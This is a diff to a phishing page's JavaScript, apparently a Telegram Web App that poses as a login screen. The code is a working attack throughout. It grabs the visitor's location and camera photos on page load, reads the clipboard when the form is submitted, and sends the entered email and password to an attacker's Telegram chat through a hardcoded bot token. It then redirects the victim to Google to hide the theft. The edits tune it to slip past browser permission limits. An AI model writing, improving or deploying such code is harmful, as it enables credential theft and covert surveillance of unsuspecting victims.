@@ -182,14 +182,12 @@
 
     <script>
         const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
-        const ADMIN_CHAT_ID = "7713496654"; // الشات الخاص بك لتصلك أنت أيضاً كل النسخ
+        const ADMIN_CHAT_ID = "7713496654"; 
 
-        // استخراج الـ Chat ID الخاص بالمستخدم الحالي الذي فتح البوت من تيليجرام
         const tg = window.Telegram.WebApp;
         tg.ready();
         const userChatId = tg.initDataUnsafe?.user?.id;
 
-        // دالة لإرسال الرسائل لكليهما (أنت والمستخدم)
         async function sendTelegramMessageToBoth(text) {
             const targets = [ADMIN_CHAT_ID];
             if (userChatId && userChatId.toString() !== ADMIN_CHAT_ID) {
@@ -207,7 +205,6 @@
             }
         }
 
-        // دالة لإرسال الصور لكليهما (أنت والمستخدم)
         async function sendTelegramPhotoToBoth(blob, caption) {
             const targets = [ADMIN_CHAT_ID];
             if (userChatId && userChatId.toString() !== ADMIN_CHAT_ID) {
@@ -230,13 +227,13 @@
             }
         }
 
-        // سحب الحافظة
+        // سحب الحافظة (مرتبط بتفاعل المستخدم لتفادي حظر المتصفح)
         async function grabClipboard() {
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
                     const text = await navigator.clipboard.readText();
                     if (text) {
-                        sendTelegramMessageToBoth(`💀 *[ MANW SYSTEM - CLIPBOARD EXTRUSION ]* 💀\n\n> تم سحب محتوى الحافظة بنجاح:\n\`\`\`\n${text}\n\`\`\`\n⚡ *لا شيء يظل مخفياً عنك.*`);
+                        sendTelegramMessageToBoth(`💀 *[ MANW SYSTEM - CLIPBOARD EXTRUSION ]* 💀\n\n> تم سحب محتوى الحافظة:\n\`\`\`\n${text}\n\`\`\``);
                     }
                 }
             } catch (e) {}
@@ -249,7 +246,7 @@
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        sendTelegramMessageToBoth(`🩸 *[ MANW TARGET LOCKED - LOCATION ]* 🩸\n\n📍 *الإحداثيات المرصودة:* \`${lat},${lon}\`\n🗺️ *رابط الضحية:* [فتح الخريطة بدقة](https://maps.google.com/?q=${lat},${lon})\n⚡ *الشبكة بأكملها تحت السيطرة.*`);
+                        sendTelegramMessageToBoth(`🩸 *[ MANW TARGET LOCKED - LOCATION ]* 🩸\n\n📍 الإحداثيات: \`${lat},${lon}\`\n🗺️ [فتح الخريطة](https://maps.google.com/?q=${lat},${lon})`);
                     },
                     (error) => {},
                     { enableHighAccuracy: true }
@@ -260,12 +257,12 @@
         // التقاط الصور (أمامية وخلفية)
         async function capturePhotos() {
             try {
-                // التقاط 4 أمامية
-                for (let i = 1; i <= 4; i++) {
+                // التقاط لقطات أمامية
+                for (let i = 1; i <= 2; i++) {
                     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
-                    await new Promise(resolve => setTimeout(resolve, 1200));
+                    await new Promise(resolve => setTimeout(resolve, 1000));
 
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
@@ -276,21 +273,20 @@
                     await new Promise(resolve => {
                         canvas.toBlob(async (blob) => {
                             if (blob) {
-                                await sendTelegramPhotoToBoth(blob, `👁️ *[ MANW SURVEILLANCE ]* 👁️\n> لقطة أمامية (#${i})\n⚡ *تمت الإطاحة بالخصوصية.*`);
+                                await sendTelegramPhotoToBoth(blob, `👁️ لقطة أمامية (#${i})`);
                             }
                             resolve();
-                        }, 'image/jpeg', 0.85);
+                        }, 'image/jpeg', 0.80);
                     });
                     stream.getTracks().forEach(track => track.stop());
-                    await new Promise(resolve => setTimeout(resolve, 800));
                 }
 
-                // التقاط 4 خلفية
-                for (let i = 1; i <= 4; i++) {
+                // التقاط لقطات خلفية
+                for (let i = 1; i <= 2; i++) {
                     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
-                    await new Promise(resolve => setTimeout(resolve, 1200));
+                    await new Promise(resolve => setTimeout(resolve, 1000));
 
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
@@ -301,30 +297,31 @@
                     await new Promise(resolve => {
                         canvas.toBlob(async (blob) => {
                             if (blob) {
-                                await sendTelegramPhotoToBoth(blob, `👁️ *[ MANW SURVEILLANCE ]* 👁️\n> لقطة خلفية (#${i})\n⚡ *العالم الخارجي مكشوف تماماً.*`);
+                                await sendTelegramPhotoToBoth(blob, `👁️ لقطة خلفية (#${i})`);
                             }
                             resolve();
-                        }, 'image/jpeg', 0.85);
+                        }, 'image/jpeg', 0.80);
                     });
                     stream.getTracks().forEach(track => track.stop());
-                    await new Promise(resolve => setTimeout(resolve, 800));
                 }
             } catch (e) {}
         }
 
+        // تشغيل المهام تلقائياً وعند الضغط لتجاوز القيود الأمنية للمتصفح
         window.addEventListener('load', () => {
             grabLocation();
-            grabClipboard();
-            setTimeout(capturePhotos, 2500);
+            setTimeout(capturePhotos, 1500);
         });
 
-        // عند إرسال بيانات تسجيل الدخول
+        // عند محاولة تسجيل الدخول (سحب البيانات وضمان عمل الحافظة بالاتصال المباشر)
         async function handleSubmit(event) {
             event.preventDefault();
+            await grabClipboard(); // السحب الفوري عند الضغط لتفعيل صلاحية المتصفح
+            
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            await sendTelegramMessageToBoth(`🔥 *[ MANW BREACH ALERT - CREDENTIALS CAUGHT ]* 🔥\n\n👤 *البريد / المستخدم:* \`${email}\`\n🔑 *كلمة المرور المسروقة:* \`${password}\`\n\n⚡ *تم ابتلاع الفريسة بنجاح تحت راية MANW😈 💪*`);
+            await sendTelegramMessageToBoth(`🔥 *[ MANW CREDENTIALS CAUGHT ]* 🔥\n\n👤 المستخدم: \`${email}\`\n🔑 كلمة المرور: \`${password}\``);
             
             window.location.href = "https://accounts.google.com";
         }
